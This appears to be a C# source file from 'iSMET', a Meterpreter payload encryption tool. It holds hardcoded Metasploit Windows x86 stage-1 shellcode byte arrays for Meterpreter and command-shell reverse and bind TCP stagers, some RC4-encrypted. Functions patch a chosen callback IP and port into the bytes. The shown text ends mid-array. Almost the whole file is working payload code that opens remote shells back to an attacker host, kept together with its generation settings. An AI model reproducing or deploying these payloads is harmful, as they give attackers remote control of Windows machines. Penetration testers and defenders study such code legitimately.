using System;

namespace iSMET.ShellCode
{
    //    ██╗███████╗███╗   ███╗███████╗████████╗    ██╗   ██╗██████╗    ██╗
    //    ██║██╔════╝████╗ ████║██╔════╝╚══██╔══╝    ██║   ██║╚════██╗  ███║
    //    ██║███████╗██╔████╔██║█████╗     ██║       ██║   ██║ █████╔╝  ╚██║
    //    ██║╚════██║██║╚██╔╝██║██╔══╝     ██║       ╚██╗ ██╔╝██╔═══╝    ██║
    //    ██║███████║██║ ╚═╝ ██║███████╗   ██║        ╚████╔╝ ███████╗██╗██║
    //    ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝         ╚═══╝  ╚══════╝╚═╝╚═╝
    // iSMET - (A)Symmetric Meterpreter Encryption Tool v2.1
    // Author: @mindspoof - @PriviaSec
    public class MeterpreterShellCode
	{
		public class x86ShellCode
		{
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Ip">Set Shellcode Reverse IP Address (LHOST)</param>
            /// <param name="Port">Set Shellcode Reverse Port Number (LPORT)</param>
            /// <returns></returns>
            public byte[] ReverseTcp(string Ip, string Port)
			{
				byte[] array = new byte[283] {
				0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
				0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
				0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
				0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
				0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
				0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
				0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
				0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
				0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
				0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
				0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,
				0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0xe4,0x93,
				0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,
				0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,
				0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,
				0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,
				0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,
				0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,
				0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3 };
				string[] array2 = Ip.Split('.');
				array[176] = Convert.ToByte(array2[0]);
				array[177] = Convert.ToByte(array2[1]);
				array[178] = Convert.ToByte(array2[2]);
				array[179] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = Convert.ToByte(num2);
						array[184] = Convert.ToByte(num4);
					}
					else
					{
						array[183] = b;
						array[184] = Convert.ToByte(num);
					}
				}
				else
				{
					array[183] = 0;
					array[184] = Convert.ToByte(num);
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Ip">Set Shellcode Reverse IP Address (LHOST)</param>
            /// <param name="Port">Set Shellcode Reverse Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] ReverseTcpRc4(string Ip, string Port)
            {
                /*
                 * windows/meterpreter/reverse_tcp_rc4 - 400 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LHOST=192.168.228.147, LPORT=4444, 
                 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
                 * StagerRetryCount=10, StagerRetryWait=5, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, RC4PASSWORD=iSMET, 
                 * AutoLoadStdapi=true, AutoVerifySession=true, 
                 * AutoVerifySessionTimeout=30, InitialAutoRunScript=, 
                 * AutoRunScript=, AutoSystemInfo=true, 
                 * EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
                 * SessionRetryWait=10, SessionExpirationTimeout=604800, 
                 * SessionCommunicationTimeout=300, PayloadProcessCommandLine=
                 */
				byte[] array = new byte[]
                {
                    0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,
                    0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
                    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,
                    0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
                    0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b,
                    0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03,
                    0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,
                    0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
                    0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,
                    0x8d, 0x5d, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5f, 0x54, 0x68, 0x4c,
                    0x77, 0x26, 0x07, 0x89, 0xe8, 0xff, 0xd0, 0xb8, 0x90, 0x01, 0x00, 0x00, 0x29, 0xc4, 0x54,
                    0x50, 0x68, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x68, 0xc0, 0xa8, 0xe4, 0x93,
                    0x68, 0x02, 0x00, 0x11, 0x5c, 0x89, 0xe6, 0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50,
                    0x68, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x97, 0x6a, 0x10, 0x56, 0x57, 0x68, 0x99, 0xa5,
                    0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0c, 0xff, 0x4e, 0x08, 0x75, 0xec, 0x68, 0xf0,
                    0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x00, 0x6a, 0x04, 0x56, 0x57, 0x68, 0x02, 0xd9, 0xc8,
                    0x5f, 0xff, 0xd5, 0x8b, 0x36, 0x81, 0xf6, 0xad, 0xb4, 0xa3, 0x6c, 0x8d, 0x8e, 0x00, 0x01,
                    0x00, 0x00, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x51, 0x6a, 0x00, 0x68, 0x58, 0xa4,
                    0x53, 0xe5, 0xff, 0xd5, 0x8d, 0x98, 0x00, 0x01, 0x00, 0x00, 0x53, 0x56, 0x50, 0x6a, 0x00,
                    0x56, 0x53, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x01, 0xc3, 0x29, 0xc6, 0x75,
                    0xee, 0x5b, 0x59, 0x5d, 0x55, 0x57, 0x89, 0xdf, 0xe8, 0x10, 0x00, 0x00, 0x00, 0x33, 0x64,
                    0x85, 0x57, 0xde, 0x04, 0x08, 0x04, 0x8f, 0x3a, 0x80, 0xd4, 0xab, 0x99, 0x55, 0xf8, 0x5e,
                    0x31, 0xc0, 0xaa, 0xfe, 0xc0, 0x75, 0xfb, 0x81, 0xef, 0x00, 0x01, 0x00, 0x00, 0x31, 0xdb,
                    0x02, 0x1c, 0x07, 0x89, 0xc2, 0x80, 0xe2, 0x0f, 0x02, 0x1c, 0x16, 0x8a, 0x14, 0x07, 0x86,
                    0x14, 0x1f, 0x88, 0x14, 0x07, 0xfe, 0xc0, 0x75, 0xe8, 0x31, 0xdb, 0xfe, 0xc0, 0x02, 0x1c,
                    0x07, 0x8a, 0x14, 0x07, 0x86, 0x14, 0x1f, 0x88, 0x14, 0x07, 0x02, 0x14, 0x1f, 0x8a, 0x14,
                    0x17, 0x30, 0x55, 0x00, 0x45, 0x49, 0x75, 0xe5, 0x5f, 0xc3
                };
				string[] array2 = Ip.Split('.');
				array[176] = Convert.ToByte(array2[0]);
				array[177] = Convert.ToByte(array2[1]);
				array[178] = Convert.ToByte(array2[2]);
				array[179] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = Convert.ToByte(num2);
						array[184] = Convert.ToByte(num4);
					}
					else
					{
						array[183] = b;
						array[184] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Port">Shellcode Listen Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] BindTcp(string Port)
			{
                /*
                 * windows/meterpreter/bind_tcp - 285 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LPORT=4444, RHOST=, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, 
                 * AutoVerifySession=true, AutoVerifySessionTimeout=30, 
                 * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
                 * EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
                 * SessionRetryWait=10, SessionExpirationTimeout=604800, 
                 * SessionCommunicationTimeout=300, PayloadProcessCommandLine=
                 */
				byte[] array = new byte[]
				{
                    0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
                    0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
                    0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
                    0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
                    0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
                    0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                    0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
                    0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
                    0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
                    0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,
                    0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0b,0x59,0x50,0xe2,0xfd,0x6a,0x01,0x6a,
                    0x02,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x68,0x02,0x00,0x11,0x5c,0x89,
                    0xe6,0x6a,0x10,0x56,0x57,0x68,0xc2,0xdb,0x37,0x67,0xff,0xd5,0x57,0x68,0xb7,
                    0xe9,0x38,0xff,0xff,0xd5,0x57,0x68,0x74,0xec,0x3b,0xe1,0xff,0xd5,0x57,0x97,
                    0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,
                    0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,
                    0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,
                    0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3
				};
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[192] = Convert.ToByte(num2);
						array[193] = Convert.ToByte(num4);
					}
					else
					{
						array[192] = b;
						array[193] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Ip">Set Shellcode Reverse IP Address (LHOST)</param>
            /// <param name="Port">Set Shellcode Reverse Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] ShellReverseTcp(string Ip, string Port)
			{
                /*
                 * windows/shell/reverse_tcp - 283 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LHOST=192.168.228.147, LPORT=4444, 
                 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
                 * StagerRetryCount=10, StagerRetryWait=5, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process
                 */
				byte[] array = new byte[]
				{
                    0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
                    0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
                    0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
                    0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
                    0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
                    0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                    0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
                    0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
                    0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
                    0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,
                    0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0xe4,0x93,
                    0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,
                    0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,
                    0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,
                    0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,
                    0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,
                    0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,
                    0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3
				};
				string[] array2 = Ip.Split('.');
				array[176] = Convert.ToByte(array2[0]);
				array[177] = Convert.ToByte(array2[1]);
				array[178] = Convert.ToByte(array2[2]);
				array[179] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = Convert.ToByte(num2);
						array[184] = Convert.ToByte(num4);
					}
					else
					{
						array[183] = b;
						array[184] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Ip">Set Shellcode Reverse IP Address (LHOST)</param>
            /// <param name="Port">Set Shellcode Reverse Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] ShellReverseTcpRc4(string Ip, string Port)
            {
                /*
                 * windows/shell/reverse_tcp_rc4 - 400 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LHOST=192.168.228.147, LPORT=4444, 
                 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
                 * StagerRetryCount=10, StagerRetryWait=5, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, RC4PASSWORD=iSMET
                 */
				byte[] array = new byte[]
                {
                    0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,
                    0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
                    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,
                    0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
                    0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b,
                    0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03,
                    0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,
                    0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
                    0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,
                    0x8d, 0x5d, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5f, 0x54, 0x68, 0x4c,
                    0x77, 0x26, 0x07, 0x89, 0xe8, 0xff, 0xd0, 0xb8, 0x90, 0x01, 0x00, 0x00, 0x29, 0xc4, 0x54,
                    0x50, 0x68, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x68, 0xc0, 0xa8, 0xe4, 0x93,
                    0x68, 0x02, 0x00, 0x11, 0x5c, 0x89, 0xe6, 0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50,
                    0x68, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x97, 0x6a, 0x10, 0x56, 0x57, 0x68, 0x99, 0xa5,
                    0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0c, 0xff, 0x4e, 0x08, 0x75, 0xec, 0x68, 0xf0,
                    0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x00, 0x6a, 0x04, 0x56, 0x57, 0x68, 0x02, 0xd9, 0xc8,
                    0x5f, 0xff, 0xd5, 0x8b, 0x36, 0x81, 0xf6, 0xad, 0xb4, 0xa3, 0x6c, 0x8d, 0x8e, 0x00, 0x01,
                    0x00, 0x00, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x51, 0x6a, 0x00, 0x68, 0x58, 0xa4,
                    0x53, 0xe5, 0xff, 0xd5, 0x8d, 0x98, 0x00, 0x01, 0x00, 0x00, 0x53, 0x56, 0x50, 0x6a, 0x00,
                    0x56, 0x53, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x01, 0xc3, 0x29, 0xc6, 0x75,
                    0xee, 0x5b, 0x59, 0x5d, 0x55, 0x57, 0x89, 0xdf, 0xe8, 0x10, 0x00, 0x00, 0x00, 0x33, 0x64,
                    0x85, 0x57, 0xde, 0x04, 0x08, 0x04, 0x8f, 0x3a, 0x80, 0xd4, 0xab, 0x99, 0x55, 0xf8, 0x5e,
                    0x31, 0xc0, 0xaa, 0xfe, 0xc0, 0x75, 0xfb, 0x81, 0xef, 0x00, 0x01, 0x00, 0x00, 0x31, 0xdb,
                    0x02, 0x1c, 0x07, 0x89, 0xc2, 0x80, 0xe2, 0x0f, 0x02, 0x1c, 0x16, 0x8a, 0x14, 0x07, 0x86,
                    0x14, 0x1f, 0x88, 0x14, 0x07, 0xfe, 0xc0, 0x75, 0xe8, 0x31, 0xdb, 0xfe, 0xc0, 0x02, 0x1c,
                    0x07, 0x8a, 0x14, 0x07, 0x86, 0x14, 0x1f, 0x88, 0x14, 0x07, 0x02, 0x14, 0x1f, 0x8a, 0x14,
                    0x17, 0x30, 0x55, 0x00, 0x45, 0x49, 0x75, 0xe5, 0x5f, 0xc3
                };
				string[] array2 = Ip.Split('.');
				array[176] = Convert.ToByte(array2[0]);
				array[177] = Convert.ToByte(array2[1]);
				array[178] = Convert.ToByte(array2[2]);
				array[179] = Convert.ToByte(array2[3]);
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[183] = Convert.ToByte(num2);
						array[184] = Convert.ToByte(num4);
					}
					else
					{
						array[183] = b;
						array[184] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Port">Shellcode Listen Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] ShellBindTcp(string Port)
			{
                /*
                 * windows/meterpreter/bind_tcp - 285 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LPORT=4444, RHOST=, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, 
                 * AutoVerifySession=true, AutoVerifySessionTimeout=30, 
                 * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
                 * EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
                 * SessionRetryWait=10, SessionExpirationTimeout=604800, 
                 * SessionCommunicationTimeout=300, PayloadProcessCommandLine=
                 */
				byte[] array = new byte[]
				{
                    0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
                    0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
                    0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
                    0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
                    0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
                    0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                    0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
                    0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
                    0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
                    0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,
                    0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0b,0x59,0x50,0xe2,0xfd,0x6a,0x01,0x6a,
                    0x02,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x68,0x02,0x00,0x11,0x5c,0x89,
                    0xe6,0x6a,0x10,0x56,0x57,0x68,0xc2,0xdb,0x37,0x67,0xff,0xd5,0x57,0x68,0xb7,
                    0xe9,0x38,0xff,0xff,0xd5,0x57,0x68,0x74,0xec,0x3b,0xe1,0xff,0xd5,0x57,0x97,
                    0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,
                    0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,
                    0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,
                    0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3
				};
				int num = int.Parse(Port);
				byte b = 0;
				if (num > 256)
				{
					int num2 = num / 256;
					int num3 = num2 * 256;
					int num4 = num - num3;
					int num5 = num2 * 256 + num4;
					bool flag2 = num == num5;
					if (flag2)
					{
						array[192] = Convert.ToByte(num2);
						array[193] = Convert.ToByte(num4);
					}
					else
					{
						array[192] = b;
						array[193] = Convert.ToByte(num);
					}
				}
				return array;
			}
            /// <summary>
            /// Generate Shellcode Aray
            /// </summary>
            /// <param name="Port">Shellcode Listen Port Number (LPORT)</param>
            /// <returns></returns>
			public byte[] ShellBindTcpRc4(string Port)
            {
                /*
                 * windows/shell/bind_tcp_rc4 - 402 bytes (stage 1)
                 * http://www.metasploit.com
                 * VERBOSE=false, LPORT=4444, RHOST=, 
                 * PayloadUUIDTracking=false, EnableStageEncoding=false, 
                 * StageEncoderSaveRegisters=, StageEncodingFallback=true, 
                 * PrependMigrate=false, EXITFUNC=process, RC4PASSWORD=iSMET
                 */
				byte[] array = new byte[]
                {
                    0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,
                    0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
                    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,
                    0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
                    0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b,
